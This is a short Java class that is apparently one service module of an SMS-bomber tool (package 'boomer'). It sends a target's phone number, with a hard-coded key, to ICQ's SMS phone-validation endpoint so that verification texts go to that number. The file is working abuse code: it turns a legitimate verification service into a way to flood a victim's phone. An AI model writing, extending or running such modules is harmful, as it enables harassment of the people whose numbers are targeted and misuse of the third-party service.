package com.XlynxX.boomer.services;

import com.XlynxX.boomer.RequestHelper;

public class ICQService extends RequestHelper {
    public ICQService() {
        setURL("https://www.icq.com/smsreg/requestPhoneValidation.php");
    }

    @Override
    public void sendMessage() {
        addParam("msisdn", getCountryCode() + getNumber());
        addParam("locale", "en");
        addParam("k","ic1rtwz1s1Hj1O0r");
        addParam("r", "45559");
        super.sendMessage();
    }

    @Override
    public void sendCall() {
        //super.sendCall();
    }
}
